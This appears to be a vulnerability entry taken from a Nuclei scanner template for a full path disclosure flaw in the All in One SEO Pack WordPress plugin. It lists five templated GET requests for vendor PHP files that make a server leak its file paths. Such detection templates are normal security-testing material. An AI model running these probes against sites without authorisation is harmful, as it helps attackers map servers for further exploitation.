# Vulnerability: WordPress All in One SEO Pack - Full Path Disclosure
**Classification:** DEBUG
**Source:** Nuclei Template (`wp-all-in-one-seo-pack-fpd.yaml`)

## Description
All in One SEO Pack for WordPress contains a full path disclosure vulnerability due to improper access restrictions in its source files, allowing unauthenticated attackers to retrieve full server paths and aiding exploitation.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/all-in-one-seo-pack/vendor/woocommerce/action-scheduler/classes/ActionScheduler_AdminView.php
GET {{BaseURL}}/wp-content/plugins/all-in-one-seo-pack/vendor/woocommerce/action-scheduler/classes/ActionScheduler_ListTable.php
GET {{BaseURL}}/wp-content/plugins/all-in-one-seo-pack/vendor/woocommerce/action-scheduler/classes/abstracts/ActionScheduler_Abstract_QueueRunner.php
GET {{BaseURL}}/wp-content/plugins/all-in-one-seo-pack/vendor/woocommerce/action-scheduler/classes/abstracts/ActionScheduler_Store.php
GET {{BaseURL}}/wp-content/plugins/all-in-one-seo-pack/vendor/woocommerce/action-scheduler/classes/abstracts/ActionScheduler_Abstract_ListTable.php
```

